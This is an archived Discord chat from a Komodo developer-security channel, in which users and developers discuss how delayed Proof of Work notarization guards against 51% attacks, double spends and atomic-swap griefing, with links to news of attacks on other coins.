@@ -1,0 +1,2807 @@
+==============================================================
+Guild: Komodo
+Channel: Archive -3 / dev-security
+Topic: Discussion of KMD security related topics for all Komodo APIs, web, wallets, dapps.
+==============================================================
+
+[21-Aug-18 03:19 AM] rexycle#8616
+:Komodo:
+
+{Reactions}
+Komodo (4) 
+
+[21-Aug-18 06:04 AM] CrisF#3405
+Hi, Could someone tell me what an ISP would think was going on when analyzing Barterdex traffic (2 native coins)?
+
+
+[27-Aug-18 11:43 AM] tolken#2655
+dPOW - considering dPOW backs up every 10min, does that mean there’s a 10min window where someone can send funds to an exchange, then cash out and effectively steal funds? I know dPOW isn’t a perfect solution (what ever is really?) but this seems like a big hole, but I think jl777 has mentioned the cost/risk makes it not generally practical.  I know something like this has been asked before, so if anyone has a link that might shed more light on this I’d appreciated it 😃
+
+
+[27-Aug-18 11:43 AM] jl777c#5810
+if an exchange doesnt wait for notarization, then certainly such things can be done
+
+
+[27-Aug-18 01:04 PM] tolken#2655
+Awesome, that sounds pretty damn great if that’s the only real situation is someone not waiting 10min 😃
+
+
+[27-Aug-18 01:11 PM] jl777c#5810
+yes, well as long as it didnt miss a notarization round, which does happen at times. there is even an api to check for the notarization lag
+
+
+[29-Aug-18 11:26 AM] Prado#3941
+Hi i was wondering if there is a Komodo Secure Pool in place or in plans that does or will do something of this 3 things:
+
+
+[29-Aug-18 11:26 AM] Prado#3941
+1: Redistribuite hash power to Komodo Chains avoiding effective or useful 51% percent attacks in the 10 minutes window
+
+
+[29-Aug-18 11:27 AM] Prado#3941
+2: Using dPOW to notarize the block winners of every chain
+
+
+[29-Aug-18 11:28 AM] Prado#3941
+3: Analizing minners in real time and saving their data in a chain for transparent analysis, security and rewards
+
+
+[29-Aug-18 11:31 AM] Prado#3941
+If there isn´t, how can we organize a team to build it (its very important for me that small, non market cap chains have a strong hash security option as well), should i just build it with my team?
+
+
+[29-Aug-18 11:34 AM] Prado#3941
+@jl777c  this will effectively add a rent security (and CDN) feature for all chains compatible with the pool (obviously komodo first) and the option to avoid non secured hashes (outside notarized pools) which i think will become a standard in years to come, as https notarized hash
+
+
+[29-Aug-18 11:47 AM] jl777c#5810
+it is a good idea for a mining pool to secure assetchains. dPoW is already notarizing all the notarized assetchains
+
+
+[29-Aug-18 02:46 PM] Alright#0419
+@Prado what can an attacker accomplish with a 10 minute reorg?
+
+
+[29-Aug-18 03:05 PM] Deleted User#0000
+Dont they have to successfully attack bitcoin at the same time within those 10 minutes? *asking for a mate
+
+
+[29-Aug-18 04:25 PM] Prado#3941
+@Alright  in big chains almost anything, my concern is for small dapps, icos and projects, where 10 minutes it´s enough, and what i think it could be happen it´s been attacked for days in lapses of 5 or 7 minutes before you realize you lost half the tokens or someone stole millons from your ico, or someone corrupted the logics of an app by double spending, in some cases tokens will be a physical representation, imagine you give 10,000 usd of inventory through tokens, just to realize you were victim of a double spending attack (that could destroy both small business, startups and komodo it self)
+
+
+[29-Aug-18 04:26 PM] Alright#0419
+just don't let them get anything of value within those 10 minutes
+
+
+[29-Aug-18 04:26 PM] Alright#0419
+but I agree, could definitely mess with dapps
+
+
+[29-Aug-18 04:27 PM] Prado#3941
+i mean that would be a short time answer, but for some apps 11 minutes confirmation will take them back to legacy backends and solutions
+
+
+[29-Aug-18 04:28 PM] Prado#3941
+if you could rely on trusted hashes that will solve almost everything
+
+
+[29-Aug-18 04:29 PM] Prado#3941
+and the techonology could be available for any pool to implement dPOW so it could inject serious FIAT or capital into KMD coin
+
+
+[29-Aug-18 04:46 PM] Alright#0419
+Not sure I quite understand what you mean by trusted hashes
+
+
+[29-Aug-18 04:46 PM] Alright#0419
+as in only certain people can mine the chain?
+
+
+[29-Aug-18 04:47 PM] Alright#0419
+that would be useful
+
+
+[29-Aug-18 04:53 PM] Deleted User#0000
+Like notary mining for assetchains but nobody else can mine?
+
+{Reactions}
+👌 (3) 
+
+[30-Aug-18 12:42 AM] jl777c#5810
+interesting! a purely notary mined assetchain....
+
+{Reactions}
+💡 (4) 
+
+[30-Aug-18 12:54 AM] Deleted User#0000
+I wouldnt do it on official notary keys as the wallets would get destroyed. But something similar seems like a good idea.
+
+
+[30-Aug-18 09:08 AM] Prado#3941
+exactly the most cool of all, is that you could use the hashes of non trusted miners to find blocks but if the block winner is not written in the chain of the pool you can ignore the rewards for those miners, with a 3 factor authentication for pools (secure hash sign,  written block winner, and dPOW request confirmed) you solve 51% attacks without loosing decentralization as anyone can implement the dPOW tech of komodo
+
+
+[30-Aug-18 09:09 AM] Prado#3941
+Because this requires high speed dPOW it needs to live in the komodo chain before going to bitcoin in 10 minutes, or it will be both too slow and too expensive to actually been implemented
+
+
+[30-Aug-18 12:12 PM] PTYX#6840
+Anything that secures the chains further is welcomed
+
+
+[30-Aug-18 12:13 PM] PTYX#6840
+I guess an asset chain can fork each year to add the new notary nodes so only NNs can mine
+
+
+[30-Aug-18 02:07 PM] Prado#3941
+NNs is notarized nodes? it sounds cool
+
+
+[30-Aug-18 02:23 PM] Prado#3941
+In strict sense a fork is not needed just a protocol, if the pools comply with the dPOW protocol the nodes accept them, it will require to check the transaction written in the chain (when a block is rewarded) and a status confirmation from komodo verifying constant dPOW of the pool chain and confirmation from the last rewarded blocks already notarized, rewards can be kept on hold until pools notarizes past rewards (making impossible to accumulate not notarized blocks)
+
+
+[30-Aug-18 02:28 PM] Prado#3941
+The protocol could be written in different languges so developers of different coins could implement the protocol in minutes, making all pools implement an assetchain in the next years
+
+
+[30-Aug-18 02:31 PM] jl777c#5810
+there is an api that pools and exchanges can use to find the last notarized block, dynamic lag and it can be done
+
+
+[30-Aug-18 02:31 PM] Prado#3941
+exactly
+
+
+[30-Aug-18 02:32 PM] jl777c#5810
+https://komodostats.com/api/notary/summary.json
+
+
+[30-Aug-18 02:32 PM] Prado#3941
+you could concentrate 99% of the hash power as long as you notarize your winnings
+
+
+[30-Aug-18 02:32 PM] jl777c#5810
+it already exists, pools and exchanges just have to use it
+
+
+[30-Aug-18 02:33 PM] Prado#3941
+Nodes would have to comply as well?
+
+
+[30-Aug-18 02:33 PM] Prado#3941
+otherwise pools and exchanges could simply ignore the api
+
+
+[30-Aug-18 02:35 PM] jl777c#5810
+if value is not being transfered until notarized, then double spends are not an issue
+
+
+[30-Aug-18 02:36 PM] jl777c#5810
+in order to double spend, there needs to be 2 spends (and typically a transfer of value from the 1st one to some other form)
+
+
+[30-Aug-18 02:38 PM] Prado#3941
+But it keeps the system with 10 minutes confirmation for transactions which happen 1000X times than blocks rewards, wouldn´t be better to put lag on rewards and not in transaction confirmations?
+
+
+[30-Aug-18 02:40 PM] jl777c#5810
+onchain doesnt matter as if it is reorged, it is reorged and like it didnt happen
+
+
+[30-Aug-18 02:40 PM] jl777c#5810
+only issue is when there is a transfer to some external item, like BTC via exchange
+
+
+[30-Aug-18 02:41 PM] jl777c#5810
+you are trying to solve a problem that isnt an actual problem
+
+
+[30-Aug-18 02:41 PM] Prado#3941
+Yeah, particulary exchange of tokens or coins for physical goods
+
+
+[31-Aug-18 07:13 PM] Prado#3941
+We could build a notarized pool and a security complement for dapps that reviews if nodes transactions or blocks are compromised (by not notarized miners and nodes) it will be really easy to add it in feature releases and we could put it publicly available to any dapp or assetchain that wants extra security wihtout white/black listing
+
+
+[31-Aug-18 07:15 PM] Prado#3941
+We can build an API to the assetchain core functions, so any pool in the world can implement the standard in relative no time. (komodo ones will be te most important for my projects but its the same for all)
+
+
+[29-Sep-18 12:06 AM] Mylo#8306
+https://www.coindesk.com/austrian-government-to-notarize-1-3-billion-bond-auction-using-ethereum/
+
+{Embed}
+https://www.coindesk.com/austrian-government-to-notarize-1-3-billion-bond-auction-using-ethereum
+Austrian Government to Notarize $1.3 Billion Bond Auction Using Et...
+The Austrian government is planning to use the ethereum blockchain to notarize the auction of a bond worth around $1.3 billion.
+https://images-ext-2.discordapp.net/external/Y6fUTLgCWGtOZs_U74zrMhE0JHV5V1h1Ld3AIXJPGoc/https/media.coindesk.com/uploads/2018/09/austria.jpg
+
+
+[29-Sep-18 12:07 AM] Mylo#8306
+Notarization onto eth for an auction.
+
+
+[29-Sep-18 12:07 AM] Mylo#8306
+Interesting what will happen as eth tries to become asic resistant with 'ProgPoW' or a move to PoS.
+
+
+[11-Oct-18 02:22 AM] Seko#7408
+Does Einsteinium already use dPoW? 
+
+Then we will have the best advertising on October 14th when the hacker attacks.
+
+
+[11-Oct-18 02:47 AM] actionslacks#4072
+hacker found out, he's gonna attack something else, but may still try emc2 just to see what happens
+
+
+[11-Oct-18 03:37 AM] Seko#7408
+@actionslacks best advertising...
+
+
+[11-Oct-18 04:15 AM] actionslacks#4072
+would have preferred the gotcha moment, but yeah, whatever gets the word out.
+
+
+[11-Oct-18 04:23 AM] ted#5473
+Einsteinium doesnt use dPoW yet,is it right?
+
+
+[11-Oct-18 04:23 AM] ted#5473
+@actionslacks
+
+
+[11-Oct-18 04:26 AM] actionslacks#4072
+i'm not completely sure but I think it has been implemented. they are ready for the attack, if it happens
+
+
+[11-Oct-18 04:26 AM] actionslacks#4072
+it was supposed to be a suprise
+
+
+[11-Oct-18 04:27 AM] ted#5473
+lol
+
+
+[11-Oct-18 04:29 AM] ted#5473
+interesting
+
+
+[11-Oct-18 04:30 AM] actionslacks#4072
+seems like a lot of coins are getting delisted from exchanges now, so there is a widespread vulnerability. I support that the guy is doing it publicly
+
+
+[11-Oct-18 04:30 AM] ted#5473
+best advertising
+
+
+[13-Oct-18 03:47 PM] FishyGuts#5085
+https://twitter.com/geocold51/status/1051242494820831237
+
+{Embed}
+GeoCold "Mischief-Maker" (@geocold51)
+https://twitter.com/geocold51/status/1051242494820831237
+https://t.co/8Cmx24O5ie
+Twitter
+
+
+[13-Oct-18 08:01 PM] CrisF#3405
+Hi, what info is available about an attacker once the attack starts? (What info would the chain have about who is performing the attack?)
+
+
+[14-Oct-18 04:09 AM] dukeleto#7326
+yes, dpow has been added to emc2: https://github.com/emc2foundation/einsteinium/commits/master
+
+{Embed}
+https://github.com/emc2foundation/einsteinium/commits/master
+emc2foundation/einsteinium
+Litecoin source tree. Contribute to emc2foundation/einsteinium development by creating an account on GitHub.
+https://images-ext-1.discordapp.net/external/zPGra2X28FffLPBuZL7tkcB_v3F_4_mNfF9pYQ1a1w0/%3Fs%3D400%26v%3D4/https/avatars3.githubusercontent.com/u/28443387
+
+
+[17-Oct-18 12:59 AM] ted#5473
+https://twitter.com/forkwitch
+
+{Embed}
+https://twitter.com/forkwitch
+forkwitch (@forkwitch)
+Tweets
+4
+Followers
+17
+https://images-ext-2.discordapp.net/external/pwbA1_lwp2j8UkskrQqsqhUtbg217vic_UKfE5KTPFI/https/pbs.twimg.com/profile_images/1051457612523495424/k4kXbS-D_normal.jpg
+Twitter
+
+
+[21-Oct-18 10:52 PM] hyperDEX#6586
+@dukeleto i think Raven Coin might have enough to cover the 300KMD a year for protection 😛
+
+
+[22-Oct-18 12:23 AM] KomodoWorld#8282
+another coin attacked:
+
+
+[22-Oct-18 12:23 AM] KomodoWorld#8282
+https://twitter.com/LetheanVPN/status/1054242006514331648
+
+{Embed}
+Lethean (@LetheanVPN)
+https://twitter.com/LetheanVPN/status/1054242006514331648
+Please read the following article regarding the Blockchain attack
+
+The vast majority of the current blocks were claimed by the attacker, so generally there is nothing to worry about. we paused trading on our exchanges for now.
+
+https://t.co/HoQiMVbQEY
+Twitter
+
+
+[22-Oct-18 12:24 AM] KomodoWorld#8282
+it's a VPN provider where you can trade bandwidth using the coin, it's a Cryptonight PoW
+
+
+[22-Oct-18 12:24 AM] KomodoWorld#8282
+https://lethean.io/
+
+{Embed}
+siteadmin
+https://lethean.io/
+Lethean VPN HomePage
+https://images-ext-2.discordapp.net/external/_jsNWIMHT4Lfl3qn8x9ktaGeUngE-4y0KxeOs42ykWg/https/lethean.io/wp-content/uploads/2018/08/LETHEAN-SITE-ver5_ICONS-09.png
+
+
+[22-Oct-18 07:31 AM] dukeleto#7326
+https://medium.com/@letheanVPN/10-20-18-blockchain-attack-791352b63241
+
+{Embed}
+https://medium.com/@letheanVPN/10-20-18-blockchain-attack-791352b63241
+10/21/18 Blockchain Attack – Lethean – Medium
+On 10/21/18 at approximately 00:00 UTC, it became clear to us that a malicious entity had attacked the LTHN blockchain. Until more…
+
+
+[22-Oct-18 07:32 AM] dukeleto#7326
+That attack requires at least 51%+ hashrate to pull off, and then exploits another issue
+
+
+[02-Nov-18 09:33 AM] luke#8628
+hello! someone mentioned a possible attack to me that would impact atomic swaps, and I was curious how barterDEX handles it. Let's say Alice wants to send BTC to Bob and receive ETH in return. My understanding is that Alice initiates the order, and a Bob accepts. Alice sends her deposit, which is 0.15% of the amount of BTC she plans to send. If Alice was malicious, after she sends her deposit, couldn't she sit around for 9 minutes until right before the next block is made on Bitcoin, to see if it is still favorable for her to make the trade (since the price of BTC may have changed by a lot more than 0.15% that she paid as deposit) and if she decides the trade is no longer beneficial to her, just not send her BTC effectively cancelling the trade? sure she would lose her deposit, but it would be a lot less than the amount she may lose on the trade. seems like attackers may try to take advantage of something like this. is this a known issue for atomic swaps? is it addressed by barterDEX?
+
+
+[02-Nov-18 09:39 AM] Deleted User#0000
+The dex fee is less than that, and its not a deposit, its a fee, alice pays it and never gets it back.
+
+
+[02-Nov-18 09:41 AM] luke#8628
+ah, ok. I guess that would make this issue worse then right? because alice doesn't even need to consider getting her dex fee back. she is even more incentivized to cancel if not favoriable for her.
+
+
+[02-Nov-18 10:04 AM] Deleted User#0000
+She cant get it back
+
+
+[02-Nov-18 10:32 AM] luke#8628
+right, so she will be even more incentivized to not send her payment if the price of BTC changes in a direction that is unfavorable for her
+
+
+[02-Nov-18 01:05 PM] jl777c#5810
+until the trade is completed, it isnt completed and will be undone, other than the alicefee. for this fee, alice does get to play around with slippage, but realistically BTC wont usually be changing 5% in price during an atomic swap
+
+
+[02-Nov-18 01:05 PM] jl777c#5810
+also a node that is bailing out half the time will soon get black listed and nobody would want to trade with your node
+
+
+[02-Nov-18 01:05 PM] jl777c#5810
+and making a new account would make you have to start building reputation from scratch
+
+
+[05-Nov-18 08:16 AM] luke#8628
+great, that makes sense. thanks @jl777c
+
+
+[09-Nov-18 09:05 AM] KomodoWorld#8282
+https://github.com/trailofbits/blockchain-security-contacts
+
+{Embed}
+https://github.com/trailofbits/blockchain-security-contacts
+trailofbits/blockchain-security-contacts
+Directory of security contacts for blockchain companies - trailofbits/blockchain-security-contacts
+https://images-ext-2.discordapp.net/external/5YI1wUwASGwMwE3R5l4UN2nznEOb6g8HGienESsCqQ4/%3Fs%3D400%26v%3D4/https/avatars3.githubusercontent.com/u/2314423
+
+
+[09-Nov-18 09:05 AM] KomodoWorld#8282
+"This directory is a community-curated resource for contacting security teams. It identifies the best way to contact an organization's security team so that hackers can report vulnerabilities directly to the organizations that can resolve them."
+
+
+[09-Nov-18 09:06 AM] KomodoWorld#8282
+Is there an email to contact Komodo team urgently for security reasons? Can be added to the list
+
+
+[13-Dec-18 10:34 AM] Alex Skidanov#8668
+Hi, question.
+
+Say a small chain with little hash power is completely overtaken (90% of hashpower is malicious), creates a completely invalid block, i.e. it mints 1B tokens on one of the accounts out of thin air, then builds 1000 otherwise valid blocks on top of it, and then initiates a cross-shard tx by burning those 1B tokens.
+
+Would Komodo somehow spot that those 1B tokens originate in an invalid block?
+
+
+[13-Dec-18 10:36 AM] jl777c#5810
+the key words there is "invalid block"
+
+
+[13-Dec-18 10:36 AM] jl777c#5810
+an invalid block will be rejected by all nodes
+
+
+[13-Dec-18 10:36 AM] jl777c#5810
+doesnt matter how much hashrate you have
+
+
+[13-Dec-18 10:42 AM] Alex Skidanov#8668
+so all nodes in Komodo validate all blocks in all chains?
+
+
+[13-Dec-18 10:43 AM] jl777c#5810
+no, why would it have to?
+
+
+[13-Dec-18 10:43 AM] jl777c#5810
+only nodes for chainX validate tx and blocks in chainX
+
+
+[13-Dec-18 10:44 AM] Alex Skidanov#8668
+right, so if 90% of chainX hashpower is controlled by malicious nodes, who will detect that the chain they build has an invalid node?
+
+
+[13-Dec-18 10:44 AM] jl777c#5810
+the nodes for chainX
+
+
+[13-Dec-18 10:44 AM] ComputerGenie#7004
+all nodes in all useful chain currencies validate all blocks in all chains
+
+
+[13-Dec-18 10:44 AM] jl777c#5810
+you have it backwards
+
+
+[13-Dec-18 10:44 AM] jl777c#5810
+unless the new block is valid, it wont be accepte
+
+
+[13-Dec-18 10:44 AM] jl777c#5810
+a single invalid tx makes a block that has it invalid
+
+
+[13-Dec-18 10:45 AM] jl777c#5810
+it is a decentralized system, the blockchain
+
+
+[13-Dec-18 10:45 AM] jl777c#5810
+no central source, or hashrate dominator can just declare an invalid tx is valid
+
+
+[13-Dec-18 10:46 AM] ComputerGenie#7004
+`if 90% of chainX hashpower is controlled by malicious nodes`
+they will be mining on their own chain that isn't recognized by legitimate nodes (because despite what CSW says, not all nodes are miners)
+
+
+[13-Dec-18 10:46 AM] Alex Skidanov#8668
+I think my understanding of cross-shard TXs is then lacking.
+
+For a cross-shard TX a "burn" needs to happen. My understanding is that "burn" is an event that happens in a block in the source blockchain (call it chainX). Say the receiving chain is chainY.
+
+Say 90% coalition in chainX creates an invalid chain in chainX that has an invalid block in it far in the past. They then create a block in that chain with an invalid block in which they do the "burn" and send such block to the chainY. How would chianY know the chain has an invalid block in it?
+
+
+[13-Dec-18 10:46 AM] Alex Skidanov#8668
+Is it expected that whomever accepts the transaction in chainY validates the entire chainX?
+
+
+[13-Dec-18 10:48 AM] ComputerGenie#7004
+`How would chianY know the chain has an invalid block in it?`
+Because "invalid" by definition goes against consensus rules (as dictated by nodes, not miners)
+
+
+[13-Dec-18 10:49 AM] Alex Skidanov#8668
+But isn't it nodes that operate chainX that know the block is invalid?
+How would nodes that operate chainY and receive the cross-shard TX know that the chain is invalid?
+
+
+[13-Dec-18 10:50 AM] ComputerGenie#7004
+_doesn't know momom enough to answer in detail here_
+
+
+[13-Dec-18 10:50 AM] jl777c#5810
+because the notaries that notarize chainY notarize valid blockhash and merkleroots
+
+
+[13-Dec-18 10:50 AM] Alex Skidanov#8668
+I see. The notaries assigned to chainX that notarize to Komodo chain / Bitcoin validate all the blocks?
+
+
+[13-Dec-18 10:51 AM] jl777c#5810
+notaries that notarize a chain run a full node for that chain
+
+
+[13-Dec-18 10:51 AM] Alex Skidanov#8668
+Makes sense, running a full node by definition validates all the blocks
+
+
+[13-Dec-18 10:51 AM] jl777c#5810
+ALL the notaries need to agree on the notarization, including MoMoM data
+
+
+[13-Dec-18 10:52 AM] jl777c#5810
+it is stronger. the notaries cross check the chain it is being notarized to
+
+
+[13-Dec-18 10:52 AM] jl777c#5810
+so you know it is not only valid but notarized and not reorged
+
+
+[13-Dec-18 10:52 AM] Alex Skidanov#8668
+All notaries in Komodo validate all chains, or different notaries are assigned to different chains?
+
+
+[13-Dec-18 10:52 AM] jl777c#5810
+for now most notaries notarize most chains
+
+
+[13-Dec-18 10:53 AM] jl777c#5810
+the incentive is automatic reelection
+
+
+[13-Dec-18 10:53 AM] Alex Skidanov#8668
+Makes sense. But obviously long term you want to scale to an extent where most notaries would only be able to notarize a small fraction of the chains, right?
+
+
+[13-Dec-18 10:53 AM] Alex Skidanov#8668
+I guess the "100M tx/second" relies on that assumption?
+
+
+[13-Dec-18 10:58 AM] jl777c#5810
+the assumption is that notaries will be able to manage many nodes
+
+
+[13-Dec-18 10:58 AM] jl777c#5810
+for 100 mil tx per second, it would require half a million chains! i dont think anybody said 100 million tx/sec anytime soon
+
+
+[13-Dec-18 11:03 AM] Alex Skidanov#8668
+well, 100m was mentioned in one of the post as a theoretically possible limit, not something short term :)
+
+so the statement "security of Komodo relies on most notaries running most chains" is correct? (I don't necessarily think it's a bad thing, just trying to confirm my understanding)
+
+
+[13-Dec-18 11:05 AM] jl777c#5810
+security of KMD relies on the notaries, yes
+
+
+[13-Dec-18 11:05 AM] jl777c#5810
+of the entire ecosystem
+
+
+[13-Dec-18 11:05 AM] jl777c#5810
+and several external coins
+
+
+[13-Dec-18 02:15 PM] grewalsatinder#9653
+Nice to see you here @Alex Skidanov 
+And glad to see this chat. Feel free to ask more anytime. 🙂
+
+
+[07-Feb-19 08:11 AM] spaul#5353
+Hello!  I'm working in a space where we are diving into a few insurance projects that will require notaries and have been discussing how the use of a 3rd party notary can be standarized
+
+
+[07-Feb-19 08:20 AM] spaul#5353
+any approved literature on the notarized nodes?
+
+
+[07-Feb-19 08:39 AM] CryptoNinjaa#5350
+@spaul  This is a very detailed explanation written by grewalsatinder - https://blog.komodoplatform.com/delayed-proof-of-work-explained-9a74250dbb86
+
+{Embed}
+https://blog.komodoplatform.com/delayed-proof-of-work-explained-9a74250dbb86
+Delayed Proof of Work Explained – Komodo Platform
+It’s 2018, and we have recently witnessed many 51% attacks (Double Spending) on various Proof of Work (PoW) based blockchains.
+https://images-ext-1.discordapp.net/external/K-fpW1anfp5YdwJNtQrc0KoC9uSWbu_VQfCUCRd8pbw/https/cdn-images-1.medium.com/max/1200/1%2AUdeyCiUcELkn4pWfADKEMA.jpeg
+
+
+[07-Feb-19 08:43 AM] spaul#5353
+THANKS!!!
+
+{Reactions}
+Komodo 
+
+[07-Feb-19 12:26 PM] Mylo#8306
+@spaul also, for that kind of use case where there may be more control of notaries, e.g. your insurance consulting firm or the actual insurance companies wanting to run their own notary network, the #kmdlabs project are doing R&D into that aspect of it, because some environments will want to manage their own incentive structures, opsec, etc.
+
+
+[07-Feb-19 12:29 PM] Mylo#8306
+e.g.
+```
+SPAUL INSURANCE NN ---> KMD ---> BTC
+MYLO CONSULTING FARM NN ---> KMD ---> BTC
+```
+then the actual KMD ---NN---> BTC elections, the different NN networks that exist may want to run for the annual elections etc.   but this may be something for 2020, 2021 in the strategic thinking of some of your types of  projects/companies/consulting etc.
+
+
+[07-Feb-19 04:03 PM] spaul#5353
+@Mylo  yes conceptually we are at the beginnings and have a similar timeline
+
+{Reactions}
+👍 
+
+[15-Feb-19 06:31 AM] Surfer007#0709
+as far as i know you were involved in the creation of the PAN token for the exchange Bitpanda, wouldn't Bitpanda also be a candidate for dPoW?
+
+
+[15-Feb-19 11:07 PM] Mylo#8306
+sorry i've not heard of PAN token.  if it's a bitcoin/zcash/litecoin/dash fork, yes - dPoW has been implmeneted on projects that started off as forks.   there are some differences between a v0.11 btc fork and v0.14 fork (e.g. segwit etc.) so depends when the fork was as to how many code changes required.   but all do-able.
+
+
+[16-Feb-19 12:22 PM] digital bullion#8223
+Pan is an ERC 20 I believe.
+
+
+[25-Mar-19 01:18 AM] pbca26#5430
+i'm not using their widget, only api
+not really sure what's your question
+it's a 3rd party api like any other api
+they don't use any security tokens so i'd say it's somewhat degraded level
+make sure you don't leak your api key anywhere
+
+
+[26-Mar-19 04:54 PM] Paul#0981
+Excitement about coinbene about a possible hack or exit scam, does anyone know what?
+
+
+[26-Mar-19 05:53 PM] PTYX#6840
+@Paul where?
+
+
+[26-Mar-19 09:12 PM] Paul#0981
+t.me/coinbene
+
+
+[26-Mar-19 09:12 PM] Paul#0981
+@PTYX
+
+{Reactions}
+👍 
+
+[30-Mar-19 06:26 AM] yope#8519
+Hi all. I am new to this discord, and the amount of information here is a bit overwhelming, so my excuses if I ask questions that have been asked before.
+
+
+[30-Mar-19 06:28 AM] yope#8519
+I am investigating Komodo security and have questions that I assume others have asked before. Nevertheless I have not been able to find some sort of FAQ or other resource answering simple questions like this for example: "Why is the use of curated notary nodes any different than just trusting some central authority for snapshotting the main chain in a simple database?"
+
+
+[30-Mar-19 06:29 AM] yope#8519
+If anyone has a pointer to a source that addresses these kind of questions, that's be appreciated.
+
+
+[30-Mar-19 06:31 AM] yope#8519
+But the public keys of the notary nodes are included in the source code, right?
+
+
+[30-Mar-19 06:31 AM] yope#8519
+So I cannot run a notary node, right?
+
+
+[30-Mar-19 06:32 AM] yope#8519
+Who are stake holders?
+
+
+[30-Mar-19 06:32 AM] yope#8519
+So that makes it have the same drawbacks of PoS, right?
+
+
+[30-Mar-19 06:34 AM] yope#8519
+Voters with more stake have power to influence consensus.
+
+
+[30-Mar-19 06:34 AM] yope#8519
+Notary nodes have a mining advantage, right? They can mine at lower difficulty.
+
+
+[30-Mar-19 06:36 AM] ComputerGenie#7004
+if one were to assume that voters could influence NNs, then their power of influence would only be over the lowest performing NNs anyway
+
+
+[30-Mar-19 06:37 AM] ComputerGenie#7004
+the highest performing NNs get "auto" re-elected based on performance
+
+
+[30-Mar-19 06:37 AM] yope#8519
+Isn't it true that If one entity accumulates enough staking power, he could eventually chose most or all NN's?
+
+
+[30-Mar-19 06:37 AM] ComputerGenie#7004
+and "at worst" the "influence" would only extend to holding back blocks of the least performing NNs anyway
+
+
+[30-Mar-19 06:38 AM] yope#8519
+Holding back blocks opens a window of 51% attacks on the KMD chain....
+
+
+[30-Mar-19 06:38 AM] yope#8519
+Not exactly harmless, right?
+
+
+[30-Mar-19 06:39 AM] ComputerGenie#7004
+`Holding back blocks opens a window of 51% attacks on the KMD chain....`
+No, because those "susceptible" are, by definition, producing less to begin with
+
+
+[30-Mar-19 06:40 AM] yope#8519
+@ComputerGenie , how is an NN's "performance" determined?
+
+
+[30-Mar-19 06:40 AM] ComputerGenie#7004
+by performing notarizations and producing KMD blocks
+
+
+[30-Mar-19 06:41 AM] yope#8519
+@Deleted User , sorry to be critical about this, but I am not convinced of that yet...
+
+
+[30-Mar-19 06:41 AM] yope#8519
+I am here to learn and discover truth
+
+
+[30-Mar-19 06:42 AM] yope#8519
+@Deleted User, but if said whale gets hold of a few NN's, he has a significant mining advantage, so he could even outmine the rest of the network in a 10minute window if the network is sufficiently weak.
+
+
+[30-Mar-19 06:44 AM] yope#8519
+What do you mean by that? Isn't KMD using PoW (if we discount the NN's for a moment)?
+
+
+[30-Mar-19 06:44 AM] ComputerGenie#7004
+between the dev nodes and top NNs keeping their jobs by doing their jobs, there's not a "breaking point" where stopage could be bought
+even if you assume that all but minsig NNs were corrupted, that 1 group would negate the stoppage of all the rest
+
+
+[30-Mar-19 06:47 AM] ComputerGenie#7004
+` Isn't KMD using PoW (if we discount the NN's for a moment)?`
+You can't "discount the NNs", because their notarizations are akin to live checkpoints
+
+
+[30-Mar-19 06:47 AM] yope#8519
+@Deleted User , But that KMD mining is done via PoW, right? So if you have access to vast hashing power, and control a few NN's, that would make it easier to outmine the rest of the network in the 10 minute snapshot window, right?
+
+
+[30-Mar-19 06:48 AM] yope#8519
+Not in the 10 minute window
+
+
+[30-Mar-19 06:49 AM] ComputerGenie#7004
+`But that KMD mining is done via PoW, right? So if you have access to vast hashing power, and control a few NN's, that would make it easier to outmine the rest of the network in the 10 minute snapshot window, right?`
+You can't negate the checkpointing that the majority of NNs do if you only control "a few" and if you control all *but* "a few", you can't negate the checkpointing that those few do
+
+
+[30-Mar-19 06:49 AM] yope#8519
+Ok, so if an attacker controls a few NN's, he has an added mining advantage (lower difficulty) and that could help him outmine the rest of the network in that 10 minute window, right?
+
+
+[30-Mar-19 06:50 AM] yope#8519
+@ComputerGenie I am not saying I take over the NN's chekpointing work, just control some of them to gain mining power.
+
+
+[30-Mar-19 06:51 AM] yope#8519
+What do you mean by that?
+
+
+[30-Mar-19 06:51 AM] yope#8519
+Who can't chose when to mine?
+
+
+[30-Mar-19 06:52 AM] yope#8519
+Yes, but if the network has decided that I get a few NN's (because I am a staking whale), I can "easy mine" whenever and however much I chose, right?
+
+
+[30-Mar-19 06:52 AM] ComputerGenie#7004
+The only "successful" theory would involve controlling 52 NNs
+
+{Reactions}
+💯 
+
+[30-Mar-19 06:53 AM] yope#8519
+No.
+
+
+[30-Mar-19 06:53 AM] ComputerGenie#7004
+yes
+
+
+[30-Mar-19 06:53 AM] yope#8519
+Why can't I chose?
+
+
+[30-Mar-19 06:53 AM] ComputerGenie#7004
+if you control less than 52 NNs, then 13 can still notarize
+
+
+[30-Mar-19 06:53 AM] yope#8519
+How's that?
+
+
+[30-Mar-19 06:54 AM] yope#8519
+@ComputerGenie , with all due respect, let @Deleted User answer, I think he understands my question. You OTOH do not...
+
+
+[30-Mar-19 06:54 AM] ComputerGenie#7004
+🤦🏽
+
+
+[30-Mar-19 06:55 AM] ComputerGenie#7004
+"hacker" 🤣
+
+
+[30-Mar-19 06:55 AM] yope#8519
+He keeps coming with the 51 NN argument, but I am not debating that.
+
+
+[30-Mar-19 06:56 AM] yope#8519
+Ok, but I am one and you are two, and out-typing both of your answer storms is not that easy.... 😅
+
+
+[30-Mar-19 06:57 AM] ComputerGenie#7004
+but that's the point, the power is meaningless to go back past the checkpoint
+all the power in the world is negated by 1 tx/block
+
+
+[30-Mar-19 06:57 AM] yope#8519
+@ComputerGenie , I am not debating that. I know that. But there are 10 minutes between snapshots, right?
+
+{Reactions}
+💯 
+
+[30-Mar-19 06:59 AM] ComputerGenie#7004
+on average, yes
+so, you can roll back 12 blocks and have 1 confirmation on your "controlled" tx
+what are you doing with that 1 confirmation?
+
+
+[30-Mar-19 06:59 AM] yope#8519
+I want to understand the risks of attacking the network in between these checkpoints successfully.
+
+
+[30-Mar-19 06:59 AM] ComputerGenie#7004
+in between checkpoints, transactions never get a 2nd confirmation
+
+
+[30-Mar-19 07:00 AM] yope#8519
+Why not? Aren't there many blockes mined in that timeframe?
+
+
+[30-Mar-19 07:00 AM] yope#8519
+One each 1 minute and 2 seconds, right?
+
+
+[30-Mar-19 07:01 AM] ComputerGenie#7004
+rawconfirmations increase with blocks
+confirmations stay at 1 until notarized, at which point confirmations = rawconfirmations
+
+
+[30-Mar-19 07:01 AM] yope#8519
+But that would make confirmations as slow as on BTC....
+
+
+[30-Mar-19 07:01 AM] yope#8519
+🤔
+
+
+[30-Mar-19 07:02 AM] yope#8519
+Ok.
+
+
